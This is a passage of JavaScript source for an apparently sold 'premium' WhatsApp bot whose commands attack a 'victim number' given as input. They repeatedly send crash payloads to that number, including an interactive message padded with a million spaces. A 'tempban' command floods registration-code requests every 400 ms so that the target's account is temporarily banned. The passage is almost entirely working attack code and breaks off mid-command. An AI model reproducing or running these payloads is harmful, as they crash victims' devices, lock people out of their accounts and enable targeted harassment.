await listxeonfck(target, oneclickxeon)
await locationxeony(target, force)
ngeloc(target, force)
await locationxeony(target, force)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
await locationxeony(target, force)
ngeloc(target, force)
await locationxeony(target, force)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
await locationxeony(target, force)
ngeloc(target, force)
await locationxeony(target, force)
await blackening(target, force2)
await locationxeony(target, force)
}
await reply(`Successfully Send Bug to ${anggazyyweb} Using ${command}. ✅`)
}
break
case "jids-unexpected": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
        case "naruto-andro": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendVariousMessage(from, encodedValue);
  await sleep(2500); // Adjusted sleep time for clarity
  sendReaction('✅');
}
break;

case 'devil-slayer':
if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Example:\n ${prefix + command} 62xxxx|5`)
victim = text.split("|")[0]
amount = text.split("|")[1]
target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
for (let i = 0; i < amount; i++) {
bughomebutton(target)
sendListMessage(target)
ngeloc(target, force)
ngeloc(target, force)
sleep(500)
sendLiveLocationMessage(target)
sleep(500)
sendSystemCrashMessage(target)
sleep(500)
iponcrash(target)
sleep(500)
pirgam(target, bugquoteddvc)
sleep(500)
bakdok(target, force)
sleep(500)
penghitaman(target, force)
anggazyy.sendMessage(target, {image: slayer07, caption: `SLAYER 07`},{quoted: m})
}
reply(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
break

case 'dev-darkness':
if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Example:\n ${prefix + command} 62xxxx|5`)
victim = text.split("|")[0]
amount = text.split("|")[1]
target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
for (let i = 0; i < amount; i++) {
bughomebutton(target)
sendListMessage(target)
ngeloc(target, force)
ngeloc(target, force)
sleep(500)
sendLiveLocationMessage(target)
sleep(500)
sendSystemCrashMessage(target)
sleep(500)
iponcrash(target)
sleep(500)
pirgam(target, bugquoteddvc)
sleep(500)
bakdok(target, force)
sleep(500)
penghitaman(target, force)
anggazyy.sendMessage(target, {document: slayer07, caption: `Darkness 㐅` },{quoted: m})
}
reply(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
break

case 'devil-virkon':
if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Example:\n ${prefix + command} 62xxxx|5`)
victim = text.split("|")[0]
amount = text.split("|")[1]
target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
for (let i = 0; i < amount; i++) {
bughomebutton(target)
sendListMessage(target)
ngeloc(target, force)
ngeloc(target, force)
sleep(500)
sendLiveLocationMessage(target)
sleep(500)
sendSystemCrashMessage(target)
sleep(500)
iponcrash(target)
sleep(500)
pirgam(target, bugquoteddvc)
sleep(500)
bakdok(target, force)
sleep(500)
penghitaman(target, force)
anggazyy.sendMessage(target, {image: slayer07, caption: `Virkon WhatsApp ✅`},{quoted: m})
}
reply(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
break

case 'bug-saluran': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} https://whatsapp.com/channel/`)
reply(`In proses....`)
let result = args[0].split('https://whatsapp.com/channel/')[1];
let target = await anggazyy.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰𝙰𝚗𝚐𝚐𝚊𝚣𝚢𝚢 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #anggazyy666"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻DevilS⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: anggazyycrash })
await anggazyy.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
reply(`<✓> Successfully Send Bug to ${target} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case "jids-lol": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "jids-system": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "jids-toui": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "jids-external": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "jids-internal": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
   case "xandroid2":
  {
	if (!isOwner) return
	{
      return reply("*This feature is for the bot only!*");
    }
    if (!text){
      return reply(`Example usage: ${prefix + command} 5`)
      }
    if (isNaN(parseInt(text))) {
      return reply("Amount must be a number");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    reply("please wait, " + command + " bug is in process..");
    await sleep(1500); // Adjusted sleep time for clarity
    sendVariousMessages(from, encodedValue);
    await sleep(2500); // Adjusted sleep time for clarity
    sendReaction('✅');
  }
  break;
case "jids-engine": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "unex-strong": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "unex-jids": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "anu-bg": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "anu-devil": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "super-bug": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case 'ios-lag':
if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Example:\n ${prefix + command} 62xxxx|5`)
victim = text.split("|")[0]
amount = text.split("|")[1]
target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
for (let i = 0; i < amount; i++) {
iponcrash(target)
bughomebutton(target)
sleep(500)
iponcrash(target)
bughomebutton(target)
sleep(500)
iponcrash(target)
bughomebutton(target)
sleep(500)
iponcrash(target)
bughomebutton(target)
sleep(500)
}
reply(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
break

case "super-devil": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case 'tempban': {
if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!text) return reply(`Example: ${prefix + command} 62|882021xxx`)
if (!/|/.test(!text)) return reply(`The data you provided is invalid!, Example: \n ${prefix + command} 62|8804643`)
let numbers = JSON.parse(fs.readFileSync('./all/tempoary.json'))
let cCode = text.split("|")[0]
let number = text.split("|")[1]
let fullNo = cCode + number
await reply(`*[ Devil 4.0 *Gen 1* Update SYSTEM ]*\n\n- Tempoary banned hass send to ${fullNo} silahkan di cek tuan.`)
let { state } = await useMultiFileAuthState('session')
let spam = makeWASocket({
auth: state,
mobile: true,
logger: pino({ level: 'silent' })
})
let dropNumber = async () => {
try {
let res = await spam.requestRegistrationCode({
phoneNumber: `+${fullNo}`,
phoneNumberCountryCode: cCode,
phoneNumberNationalNumber: number,
phoneNumberMobileCountryCode: 724,
})
if (res.reason === 'temporarily_unavailable') {
console.log(`Invalid Number (Possibility of Interrupted Registration): +${res.login}`)
await sleep(1000)
await dropNumber()
}
} catch (error) {
console.error(error)
}
}
numbers[fullNo] = { cCode, number };
fs.writeFileSync('./all/tempoary.json', JSON.stringify(numbers, null, '\t'))
setInterval(() => {
dropNumber()
}, 400)
}
break
case 'super-mybug': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 1; j++) {
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await listxeonfck(target, oneclickxeon)
await locationxeony(target, force)
ngeloc(target, force)
await locationxeony(target, force)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
 await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await locationxeony(target, force)
ngeloc(target, force)
await locationxeony(target, force)
await blackening(target, force2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'super-crash': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 1; j++) {
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await listxeonfck(target, oneclickxeon)
await locationxeony(target, force)
ngeloc(target, force)
await locationxeony(target, force)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
 await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await locationxeony(target, force)
ngeloc(target, force)
await locationxeony(target, force)
await blackening(target, force2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case "super-myengine": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
